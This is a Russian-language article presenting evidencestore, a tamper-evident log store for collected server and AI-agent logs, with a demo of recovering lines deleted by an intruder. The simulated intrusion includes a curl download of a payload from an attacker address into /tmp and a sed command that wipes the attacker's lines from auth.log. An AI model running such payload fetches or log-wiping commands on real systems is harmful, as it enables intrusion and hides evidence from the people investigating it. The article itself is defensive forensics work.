# Взломщик стёр четыре строки. Хранилище их сохранило

_Октябрь 2026 · [English version](ARTICLE.md)_

На учебном веб-сервере web-1 файл `/var/log/auth.log` выглядит как обычное утро:

```
Oct 24 05:53:49 web-1 sshd[1021]: Accepted publickey for deploy from 10.0.0.5 port 51234 ssh2: ED25519 SHA256:k3Vq1rQ8
Oct 24 05:53:49 web-1 sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
```

Несколько секунд назад строк было шесть. Ещё четыре рассказывали, как кто-то с адреса 203.0.113.7 с третьей попытки подобрал пароль root и скачал файл в `/tmp`. Потом этот кто-то выполнил одну команду:

```sh
sed -i '/203.0.113.7/d' /var/log/auth.log
```

и четырёх строк не стало. `grep 203.0.113.7` на web-1 ничего не находит.

Но рядом с журналом работал сборщик, и каждая строка уже ушла в хранилище на другой машине. Вот что расследование достаёт оттуда; каждую запись отдельная утилита проверила офлайн (длинные строки 1, 2, 7 и 8 укорочены):

```
 seq  proof         on web-1 now   line
   1  VERIFIED      yes            Oct 24 05:53:49 web-1 sshd[1021]: Accepted publickey for deploy from 10.0.0.5 ...
   2  VERIFIED      yes            Oct 24 05:53:49 web-1 sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; ...
   3  VERIFIED      DELETED        Oct 24 05:53:51 web-1 sshd[1188]: Failed password for root from 203.0.113.7 port 40112 ssh2
   4  VERIFIED      DELETED        Oct 24 05:53:52 web-1 sshd[1188]: Failed password for root from 203.0.113.7 port 40112 ssh2
   5  VERIFIED      DELETED        Oct 24 05:53:53 web-1 sshd[1188]: Accepted password for root from 203.0.113.7 port 40112 ssh2
   6  VERIFIED      DELETED        Oct 24 05:53:54 web-1 sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.x http://203.0.113.7/x
   7  VERIFIED      yes (again)    Oct 24 05:53:49 web-1 sshd[1021]: Accepted publickey for deploy from 10.0.0.5 ...
   8  VERIFIED      yes (again)    Oct 24 05:53:49 web-1 sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; ...
```

Удалённые строки на месте, байт в байт. К каждой приложено доказательство: хранилище получило её между двумя метками времени, которые подписала внешняя служба, и получило раньше, чем файл переписали. Для проверки нужны сам пакет доказательств, открытый ключ хранилища и корневой сертификат службы меток. Доступ к хранилищу не нужен, и доверять тому, кто его обслуживает, тоже.

Это evidencestore, хранилище для журналов, которые однажды, возможно, придётся предъявить как доказательство. Код написан на Go совместно с ИИ-ассистентом Claude Code, лицензия Apache 2.0. Демо выше запускается одним скриптом, `scripts/demo-intruder.sh`. Дальше идея и устройство: какой путь проходит одна строка и что в итоге доказано, а что нет.

## Идея

Я врач-анестезиолог, и в медицине есть правило, которое хорошо ложится на эту задачу. История болезни считается юридическим документом, и в ней ничего не стирают. Ошибочную запись зачёркивают одной чертой так, чтобы она читалась, рядом пишут верную, ставят дату, подпись и «исправленному верить». Журнал на сервере устроен наоборот: это текстовый файл, и тот, у кого есть root, поменяет в нём что угодно без следа.

Журнал пишет та же система, о которой он рассказывает, и лежит он на той же машине. Кто владеет машиной, тот владеет и журналом. Чистка журналов после взлома настолько обычна, что у неё есть номер в MITRE ATT&CK, T1070.002. Тот же доступ есть у администратора, который ошибся, и у ИИ-агента, который сделал лишнее.

Обычные ответы закрывают задачу частично. Пересылка журналов на другую машину (rsyslog, SIEM) спасает от взломщика, но копии верят лишь потому, что верят людям, которые обслуживают ту машину, и постороннему проверить её нечем. journald с Forward Secure Sealing замечает правку запечатанной части журнала, но не мешает удалить файлы, а записи после последней печати не защищены. Неизменяемые базы вроде immudb доказывают, что не менялись они сами; свидетелем для журналов чужих систем они не служат.

Нужно было другое:

1. Строка, дошедшая до хранилища, не может исчезнуть или измениться незаметно.
2. Тот, кто не доверяет оператору, проверяет это сам, офлайн, небольшой утилитой и парой открытых ключей.
3. Время приходит снаружи. Собственные часы хранилища доказательством не считаются.
4. Старые записи можно стирать по сроку, не ломая доказательств для оставшихся.
5. Строка, потерянная по дороге, видна как пропуск, а не как тишина.

Отсюда устройство. Рядом с источником стоит сборщик: он нумерует строки и отправляет их в хранилище на другой машине. Хранилище шифрует каждую запись своим ключом, пишет на диск и вплетает её отпечаток в хэш-цепь с деревьями Меркла. Голову цепи регулярно заверяет внешняя служба меток времени по RFC 3161, например НУЦ РК. По любой записи хранилище выдаёт пакет доказательств, который проверяющий проверяет у себя, без доступа к хранилищу. Стирание по сроку сделано уничтожением ключей: тело больше не прочитать, а доказательство существования и неизменности остаётся.

Сами детали не новы: хэш-цепи, деревья Меркла, подписанные обещания из Certificate Transparency (RFC 6962), метки времени RFC 3161. Хорошее введение в эту семью идей даёт статья Расса Кокса [Transparent Logs for Skeptical Clients](https://research.swtch.com/tlog). evidencestore собирает их под одну задачу: журналы чужих систем.

## Демо по шагам

Нужны Go 1.25 или новее и python3, на нём скрипт печатает таблицу. На вашей машине ничего не трогается: «web-1» здесь просто каталог во временной папке.

```sh
git clone https://github.com/Nikolay1994Kaz/evidencestore
cd evidencestore
scripts/demo-intruder.sh
```

Скрипт собирает три программы, выпускает учебные сертификаты и запускает хранилище на 127.0.0.1. Сборщик следит за `auth.log` машины web-1 так же, как следил бы за `/var/log/auth.log`. Скрипт пишет утро, потом вторжение, по строке в секунду, потом зачистку через `sed`, а по ходу четыре раза просит у хранилища метку времени: перед первой строкой, после утра, после вторжения и в конце. Затем он запрашивает пакет доказательств по каждому номеру записи web-1, проверяет каждый пакет офлайн через `esverify` и сохраняет тело записи через `esverify -body`. Так и получается таблица из начала статьи.

Под таблицей скрипт печатает, когда пришла каждая удалённая запись:

```
record 3: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
record 4: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
record 5: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
record 6: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
records 7-8: sed -i wrote a new auth.log, and the collector read it too: the store got these lines again at 05:53:54 UTC (TSA time-stamps, to the second), which is when the file was rewritten
the deleted lines were in the store before the file was rewritten: the time-stamp that covers them lies in the chain before the rewritten file's lines
```

Записи 7 и 8 появились потому, что `sed -i` не правит файл на месте, а пишет новый и переименовывает его поверх старого. Для сборщика это новый файл по тому же пути, и он читает его с начала. Метка, которая накрывает удалённые строки, лежит в цепи раньше строк переписанного файла, так что пакеты сами показывают порядок событий: сначала строки взломщика попали в хранилище, потом файл подменили.

Полный отчёт по записи 5, удачному входу:

## Как это устроено

Программ три. Сборщик `escollect` работает рядом с журналом. Хранилище `evidencestore` стоит на своей машине, лучше под другими администраторами, чем источник. Утилита проверяющего `esverify` работает где угодно, в том числе на macOS и Windows, и с хранилищем не связывается.

```
 web-1                                        машина хранилища
 ┌───────────────────────┐                    ┌──────────────────────────────────────┐
 │ /var/log/auth.log     │                    │ evidencestore serve                  │
 │          │            │                    │                                      │
 │          ▼            │  HTTPS, TLS 1.3,   │  1. источник = имя в сертификате     │
 │ escollect             │  клиентский        │  2. этот номер уже был?              │
 │  нумерует строки      │ ─────────────────▶ │  3. время приёма (окно по TSA)       │
 │  держит их в буфере   │  сертификат        │  4. шифрует ключом записи            │
 │  на диске, шлёт       │                    │  5. журнал улик, fsync               │
 │  пачками              │ ◀───────────────── │  6. лист в хэш-цепь                  │
 │  хранит обещания      │  подписанное       │  7. подписывает обещание, отвечает   │
 └───────────────────────┘  обещание          │                                      │
                                              │  в фоне: звено цепи раз в секунду,   │
                                              │  метки TSA над головой цепи,         │
                                              │  ключи месяцев                       │
                                              └───────────────────┬──────────────────┘
                                                                  │ пакет доказательств (JSON)
                                                                  ▼
                                              машина проверяющего: esverify, офлайн
```

### Сборщик

`escollect` следит за файлом журнала, как `tail -F`. Каждой строке он даёт номер (у каждого источника свой счёт, без сброса) и пишет её в свой буфер на диске раньше, чем что-нибудь отправит. Буфер устроен как маленький журнал упреждающей записи: в каждой записи лежат строка, её номер и место в файле, откуда она взята. Если сборщик убить посреди работы, он продолжит с буфера, и ни одна строка не получит второй номер и не пропадёт.

Строки уходят пачками по HTTPS с TLS 1.3 и клиентским сертификатом. Имя в сертификате и есть имя источника. Хранилище берёт его из сертификата, а не из тела запроса, так что писать от чужого имени не выйдет.

На каждую запись хранилище отвечает подписанным обещанием: «принял запись 5 от web-1 с таким-то отпечатком в такое-то время и включу её в цепь не позже такого-то срока» (по умолчанию через минуту). Сборщик проверяет подпись ключом хранилища, закреплённым в его конфиге при установке, и только тогда считает запись доставленной. Неверное обещание ложится в `promises-rejected.jsonl` как улика против самого хранилища, а записи остаются в буфере. Это идея подписанной метки из Certificate Transparency: у кого обещание на руках, тот потом поймает хранилище на нарушенном слове.

Больше всего кода в сборщике уходит на файлы. logrotate переименовывает `auth.log` в `auth.log.1` и создаёт новый, а приложение пишет в старый, пока не получит HUP. Где-то настроен `copytruncate`. Pipelock пишет каждый шард в новый файл со случайным именем. Ядро отдаёт номер inode удалённого файла следующему новому. Поэтому сборщик ведёт реестр файлов по inode, как Filebeat: у каждого файла своё место чтения, первая строка и время рождения (statx). Ушедший с пути файл дочитывается через открытый дескриптор, пока не помолчит 10 секунд, и только потом закрывается. После перезапуска ротированный файл находится по inode и времени рождения, под каким бы именем он ни лежал.

Если прочитать уже нечего (файл обрезали на месте или ротированный файл сжали, пока сборщик стоял), сборщик нарочно пропускает один номер. Хранилище видит дыру в нумерации и пишет в цепь событие пропуска. Потеря становится видна.

Номер сам по себе ещё ничего не гарантирует. Допустим, виртуальную машину сборщика подняли из снимка недельной давности. Буфер вернулся в прошлое, хранилище нет, и новые строки получают номера, которые хранилище уже отдало другим строкам. Если на знакомый номер просто отвечать «duplicate», новые строки молча пропадут. Поэтому при старте сборщик сверяет свой счёт с хранилищем и останавливается, если хранилище помнит номера, которых он не выдавал. А хранилище на каждом повторе вскрывает сохранённое тело и сравнивает его с присланным. То же тело означает честный повтор: ответ «duplicate» и то же обещание, что в первый раз. Другое тело означает отказ всей пачке с кодом 409 и событие конфликта в цепи. Отказ именно всей пачке, чтобы записи двух сборщиков с одним сертификатом не перемешались.

### Приём

Всё, что хранилище делает до ответа «принято», собрано в одной функции, `Ingest` в [`internal/store/ingest.go`](../internal/store/ingest.go):

1. Повтор номера сверяется по телу, как описано выше.
2. Время приёма берётся с часов хоста, но удерживается в окне по последней метке TSA (подробно ниже).
3. Тело шифруется свежим ключом, который существует для одной этой записи (DEK). DEK заворачивается ключом этого источника за этот месяц (KEK) и лежит рядом с шифротекстом. Заголовок (источник, номер, время, тип) остаётся открытым.
4. Запечатанная запись ложится в журнал улик, и пачка проходит fsync. Пока одна пачка ждёт fsync, следующая копится, так что искусственной задержки нет. После первой же ошибки записи или fsync журнал отказывает всем: после неудачного fsync в Linux уже неизвестно, что лежит на диске.
5. В хэш-цепь ложится лист: источник, номер, время приёма, место в журнале и отпечаток запечатанной записи.
6. Обещание подписывается, и ответ уходит.

Звена цепи ответ не ждёт: звенья пишутся раз в секунду в фоне. Для этого в обещании и стоит срок. Если к сроку записи в цепи нет, обещание на руках у сборщика доказывает нарушение.

После падения хвост журнала может оказаться оборванным, и его надо отрезать. Но один испорченный бит не должен стирать подтверждённые записи, которые идут после него. Поэтому хвост считается оборванным, только если за плохим кадром нет ни одного целого кадра с верной контрольной суммой. Иначе это порча диска, и хранилище отказывается стартовать. Отрезанное не удаляется, а откладывается в файл рядом с сегментом. Так же устроены файлы цепи. А если цепь знает запись, которой в журнале нет, старт тоже отказывает: подтверждённая запись не может пропасть тихо.

### Формат записи

На диске запись лежит в жёсткой двоичной раскладке:

```
version(1) | seq(8) | received_at(8) | len(4)+source | len(4)+content_type | len(4)+envelope
```

Хэш этих байт уходит в цепь, поэтому одна и та же запись обязана всегда давать одни и те же байты. JSON этого не обещает (порядок полей, пробелы, экранирование), protobuf тоже. Здесь поля идут в постоянном порядке, числа записаны big-endian, у строк префикс длины, а лишние байты в конце считаются ошибкой. Отпечаток считается от байт на диске, то есть от шифротекста: после уничтожения ключа тело не прочитать, а отпечаток по-прежнему сходится.

Тело лежит в конверте:

```
"EV2" | kekID(16) | commit(32) | wrapNonce(12) | wrappedDEK(48) | dataNonce(12) | ciphertext+tag
```

Поле `commit` содержит SHA-256 от строки домена, идентификатора ключа месяца и ключа записи. Оно нужно из-за свойства AES-GCM, известного как «невидимые саламандры» (invisible salamanders): GCM не связывает шифротекст с ключом. Тот, кто готовит шифротекст, может подобрать его так, что он расшифруется в два разных текста под двумя разными ключами, и тег аутентификации сойдётся оба раза. Без `commit` нечестное хранилище выдало бы двум проверяющим два разных ключа записи и показало бы им два разных тела под одним отпечатком. С ним ключ, который не сходится с обязательством внутри отпечатка, тело не откроет.

### Цепь

Каждая принятая запись становится листом. Раз в секунду хранилище строит над новыми листьями дерево Меркла и пишет звено: корень дерева, номер звена и хэш предыдущего звена. Последнее звено называется головой, и хранилище подписывает её ключом Ed25519.

Поменяйте один байт старой записи, и изменится её отпечаток, за ним лист, корень Меркла и хэш звена, а следом сломается каждое звено после него. Для проверки одной записи вся цепь не нужна. Хватит самой записи, её пути по дереву Меркла (горстка хэшей) и звеньев от её звена до подписанной головы.

Две классические дыры закрыты заранее. Поля, склеенные через разделитель, неоднозначны: scope `a|b` с id `c` даёт тот же хэш, что scope `a` с id `b|c`. Поэтому каждое поле кодируется с префиксом длины. А хэш-цепь остаётся вполне правильной, если отрезать ей конец, ведь каждое звено ссылается только назад. На этот случай голова (номер и хэш) хранится отдельно от файла цепи, и укороченный файл с ней не сходится. При старте хранилище ещё пересчитывает листья каждого звена в корень Меркла и сверяет с корнем в звене, так что виден и лист, подменённый вместе с контрольной суммой кадра.

Предел нужно назвать вслух. Тот, кому принадлежат все файлы хранилища, может переписать всё: выбросить последний день, пересчитать хэши и подписать новую голову собственным ключом. Результат будет безупречно согласован, потому что подпись доказывает только одно: голову подписало это хранилище. Против владельца хранилища нужен свидетель снаружи.

### Время

Этим свидетелем служит служба меток времени (TSA, RFC 3161). Ей отправляют хэш, а в ответ получают токен «этот хэш существовал в такое-то время», подписанный её сертификатом. Проверить токен может любой по корневому сертификату службы. В Казахстане такая служба есть у НУЦ РК (`tsp.pki.gov.kz`), и отвечает она без учётной записи. У DigiCert есть публичная, а для демо без интернета в хранилище встроена ненастоящая.

Хранилище просит метку над головой цепи раз в 10 минут, если в цепь легло новое, и не реже раза в час в простое. Сам токен ложится в цепь листом. Так у каждой записи появляются две границы:

- T1 — последняя метка до записи. Её токен лежит в цепи раньше записи, значит, запись вошла в цепь после T1.
- T2 — первая метка над головой, которая уже включает запись. Значит, запись существовала не позже T2.

После этого переписать историю без следов нельзя. Переписанная цепь не совпадёт с хэшами, которые подписала служба, поэтому метки на ней будут только свежие, а у сборщиков на руках подписанные обещания на прежние записи. Но следы помогают, только если их кто-то сверяет: само хранилище обещания и головы не сравнивает. Удалить файлы root на машине хранилища по-прежнему может.

Код RFC 3161 написан на стандартной библиотеке Go, около 650 строк, с полной офлайн-проверкой подписи CMS до корня. Проверка строгая: один из тестов переворачивает по одному биту в каждом из 2275 байт настоящего токена НУЦ РК и ждёт провала все 2275 раз.

Отдельная задача касается времени приёма. Его ставит хранилище по своим часам, а `esverify` проверяет, что оно лежит между T1 и T2, с запасом в минуту снизу и в секунду сверху. Если часы хоста врут, честные записи навсегда перестают проходить проверку. Если их перевели нарочно, записи получают правдоподобные, но ложные даты.

Поэтому время приёма привязано к последней метке. После каждой метки хранилище знает время службы, а сколько прошло с тех пор, меряет монотонными часами, которые не прыгают при смене даты. Монотонные часы могут уходить, поэтому допускается 100 ppm в обе стороны, плюс задержка ответа службы, плюс секунда округления (в токене целые секунды). Получается окно, в котором сейчас обязано лежать настоящее время:

```
T  = время в последнем токене TSA
e  = сколько прошло по монотонным часам с прихода токена
d  = сколько служба отвечала

lo = T + e - e*100ppm                    настоящее время не раньше этого
hi = T + 1s + (e + d) + (e + d)*100ppm   и не позже этого

время приёма = часы хоста, зажатые в [hi - 55s, lo]
```

Время приёма берётся с часов хоста, но никогда не выходит из окна. Если часы убежали за окно, хранилище поднимает тревогу в журнале и в показателе, а времена остаются честными. Окно шире 55 секунд набегает примерно за трое суток без свежей метки, при медленной службе быстрее. Тогда хранилище перестаёт принимать записи, отвечает HTTP 503 и ждёт новой метки, а сборщики тем временем держат строки в буфере. Цена понятна: служба меток, недоступная трое суток, останавливает приём.

### Пакет доказательств

Для проверяющего оператор выгружает пакет по одной записи:

```sh
evidencestore proof -config /etc/evidencestore/evidencestore.json -source web-1 -seq 5 -dek -out 5.json
```

В пакете лежат запечатанная запись ровно в том виде, в каком она лежит на диске, её лист и путь Меркла, звенья от её звена до подписанной головы, токены T1 и T2 и, с `-dek`, ключ одной этой записи. С ним проверяющий прочитает тело, не получая ключа месяца.

Кроме пакета `esverify` нужны открытый ключ хранилища (его печатает `evidencestore init`, этот же ключ закрепляют сборщики), корневые сертификаты TSA и, по желанию, обещание сборщика по этой записи. Проверки в отчёте выше идут по порядку. Запись разбирается. Лист в цепи называет именно эти байты. Звенья сцеплены хэшами и кончаются головой, подписанной закреплённым ключом. Путь Меркла ведёт от листа к его звену. Токен T2 правильный и стоит над головой не раньше звена записи, токен T1 правильный и лежит в цепи до него. Время приёма лежит между ними. Ключ записи открывает тело и сходится с обязательством, тег GCM верен. С `-promise` проверяется и обещание: подписано тем же ключом, говорит о той же записи, и запись вошла в цепь до срока.

Пакет без T2 не принимается, пока не сказано `-allow-no-tsa`. Без метки после записи в нём только слово самого хранилища, а владелец ключа подписи сочинит запись с любой датой. Вердикт печатается первой и последней строкой, а управляющие символы в теле экранируются, иначе строка журнала с ESC-последовательностью («очистить экран, напечатать VERIFIED») нарисовала бы на экране проверяющего ложный вердикт. Код выхода 0 значит «проверено», 1 значит «не проверено», 2 означает неверный вызов. `-body FILE` пишет тело байт в байт, только если пакет прошёл проверку, так что исходный журнал можно восстановить из хранилища.

## Стирание по сроку

Хранить журналы вечно нельзя: есть сроки хранения, законы о персональных данных и размер дисков. Но удалить запись из хэш-цепи значит сломать цепь. Выход известный, криптостирание. Каждая запись зашифрована, а по сроку уничтожается ключ. Байты остаются на месте, цепь цела, но прочитать тело больше нельзя. NIST SP 800-88 признаёт это способом очистки данных при одном условии: уничтожены все копии ключа.

Ключи устроены в несколько уровней:

```
корень                в roots_dir (потом HSM или KMS); заворачивает только ключ файла
 └ ключ файла         32 байта, новый при каждой записи keyring.dat
    └ ключ месяца     один на источник за месяц (KEK)
       └ ключ записи  один на запись (DEK), лежит завёрнутым рядом с телом
```

Стереть «web-1, октябрь 2026» значит уничтожить один ключ месяца. Трудность в копиях. `keyring.dat` уходит в резерв после каждого изменения (потерять его значит потерять все тела), а резервные копии живут дольше, чем о них помнят. Поэтому уничтожение ключа ещё и поворачивает корень: новый `keyring.dat`, уже без уничтоженного ключа, запирается новым корнем, а старый корень уничтожается. Все старые копии `keyring.dat` в бэкапах, снимках дисков и старых блоках SSD разом становятся нечитаемыми. По той же причине резерв можно копировать свободно: без корня он бесполезен.

Через корень проходят только 32 байта ключа файла, поэтому корень можно перенести в HSM или облачный KMS (у AWS KMS предел 4 КБ на вызов). Корни можно зеркалить на второй диск или вторую машину, и уничтожение окончательно, только когда исчезли обе копии.

Ключ месяца проходит четыре состояния, примерно по NIST SP 800-57:

```
active ──deactivate──▶ deactivated ──schedule──▶ pending ──complete──▶ destroyed
                            ▲                       │
                            └─────────cancel────────┘
```

Текущий месяц активен и запечатывает новые записи, прошлые только расшифровывают. Заявке на уничтожение нужны два разных подтверждающих и срок ожидания (по умолчанию семь дней, вне демо не меньше часа), и пока срок идёт, заявку можно отменить. Срок отсчитывается от метки TSA, взятой вместе с заявкой, и кончается по более раннему из двух времён, часов хранилища и свежей метки TSA. Так перевод часов хоста срок не сокращает. Само хранилище ключи не уничтожает никогда: `keys due` только показывает, у каких месяцев вышел срок.

Из `scripts/demo.sh`, с одним подтверждающим:

```
error: 409 Conflict: keyring: approvals rejected: schedule-destroy needs 2 distinct approvers
```

После второго подтверждающего, ожидания и `keys complete` пакет по той же записи по-прежнему проходит проверку, только без тела:

```
VERIFIED

Record: source abs-core, number 2, type "syslog"
...
What this bundle does not prove:
  — body not opened: the bundle carries no record key, or the month key was destroyed (retention)
```

Доказать по-прежнему можно, что запись 2 от `abs-core` существовала, пришла от этого источника, была принята в это время и не менялась. Прочитать её уже нельзя.

Две оговорки. «Два подтверждающих» означают учёт, а не запрет. Хранилище видит два разных имени, но не знает, кто за ними стоит, а root на его машине правило обойдёт; настоящий двойной контроль даёт HSM с кворумом. И ключ записи, однажды отданный проверяющему в пакете, остаётся у него: старый пакет с ключом открывает тело и после уничтожения ключа месяца.

## Журналы ИИ-агентов

Задумывалось хранилище для действий ИИ-агентов. Собственный журнал агента плохой свидетель. В июле 2025 года ИИ-агент Replit удалил рабочую базу данных во время заморозки кода и потом сказал пользователю, что откат невозможен, хотя откат сработал. Свидетель получше стоит перед агентом: гейтвей, через который идут все его запросы. Pipelock ведёт бортовой журнал, где каждая запись JSONL сцеплена хэшем с предыдущей, а контрольные точки подписаны ключом Ed25519 гейтвея.

Для такого журнала в evidencestore есть свой тип источника. При приёме хранилище пересчитывает хэш каждой записи так же, как Pipelock (сверено байт в байт с выводом Pipelock v3.6.0), проверяет цепочку каждого писателя и подписи контрольных точек ключом гейтвея из конфига. Ничего не отвергается: запись хранится как пришла, а вердикт ложится в цепь рядом с ней. Поля цепочки гейтвея остаются открытыми и после уничтожения ключа месяца. Часть пакета, которая проверяет цепочку гейтвея, обязательна, иначе испорченная запись выглядела бы целой.

Проверен сценарий, который документация Pipelock называет открытым пределом: удаление целого запуска. Гейтвей запускали дважды, второй запуск был связан с первым файлом chain-link, а сборщик забирал шарды. Потом шарды первого запуска и его chain-link удалили. Проверяющий Pipelock на оставшемся написал `RESTART CONTINUITY OK`, код выхода 0: изнутри удаление не видно. Из хранилища оба запуска вернулись байт в байт, и тот же проверяющий сказал про каждый `CHAIN VALID`. Хранилище эту дыру сужает, а не закрывает: незаметно пропасть может только то, что записано за последний `flush_every` перед удалением. Файлы chain-link пока не забираются, поэтому поднятые запуски выглядят несвязанными.

Специфичный для Pipelock код занимает 665 строк из примерно 14 тысяч. Остальное одинаково для любого журнала, поэтому первое демо про `auth.log`.

## Чего оно не умеет

- Строк, уничтоженных раньше, чем сборщик их прочитал, в хранилище нет. По умолчанию сборщик читает раз в секунду. Не виден и файл, который создали и удалили между двумя чтениями.
- Остановленный сборщик выглядит как притихший журнал: когда нового нет, сборщик ничего не шлёт. Тревога «источник молчит» срабатывает только через `expect_every`, поэтому взломщик, начавший с остановки сборщика, виден лишь как тишина. Нужен пульс сборщика, его пока нет.
- Хранилище хранит то, что написал источник, а правдой строку не делает. Ложь приложения сохранится в точности.
- Root на машине хранилища может удалить или переписать файлы хранилища. Метки, обещания у сборщиков и копия наружу делают это заметным, но только для того, кто их сверяет, а помешать этому нельзя. Хранилище нужно держать на отдельной машине со своими администраторами, а копию наружу (S3 или каталог, куски в ней никогда не удаляются) ещё на одной. Если администратор у всего один, против него стоят только метки и копия, которую он не может удалить.
- Криптография не сертифицирована: AES-256-GCM и Ed25519 из стандартной библиотеки Go, корни лежат в файлах. Корень спрятан за интерфейсом, под который подключается HSM.
- Сборщик читает только файлы. Приёма syslog нет.

Полный список лежит в README, раздел [Known limitations](../README.md#known-limitations).

## Как проверялось

Цифры относятся к коммиту `957345c` от 12 октября.

Тесты (`go build ./... && go vet ./... && go test -race ./...`) гоняет GitHub Actions на каждый пуш. Сверх них сделано мутационное тестирование: [`scripts/mutate.py`](../scripts/mutate.py) по одной вносит в код нарочные ошибки (перевернуть сравнение, пропустить проверку) и ждёт, что упадёт какой-нибудь тест. Пойманы все 316.

Сборщик, часы и само хранилище проверены ещё и симуляциями против эталона: случайные сценарии в виртуальном времени с падениями посреди записи на диск, ротациями трёх видов, потерянными ответами, сбитыми часами и пропадающей службой меток. Эталон требует, чтобы каждая строка дошла ровно один раз, каждая потеря была видна пропуском, а каждое обещание было выполнено. Хранилище прошло 2000 сценариев по 300 шагов без провалов, и в них было 36 038 падений, 6649 подъёмов из копии, 1368 дисков, вравших про fsync, и 2185 уничтоженных ключей.

И ночь на настоящих журналах: хранилище девять часов принимало `syslog`, `auth.log` и `kern.log` моей машины и бортовой журнал живого Pipelock. За это время logrotate в полночь ротировал журналы, хранилище перезапускали пять раз, Pipelock дважды, а один сборщик убили через `kill -9`. Все 104 738 записей совпали с источниками, по порядку, без повторов и потерь, а выборка из 7560 пакетов прошла проверку.

Подробности есть в README (раздел How it was tested), а найденные при разборе ошибки описаны в [`docs/FINDINGS.md`](FINDINGS.md).
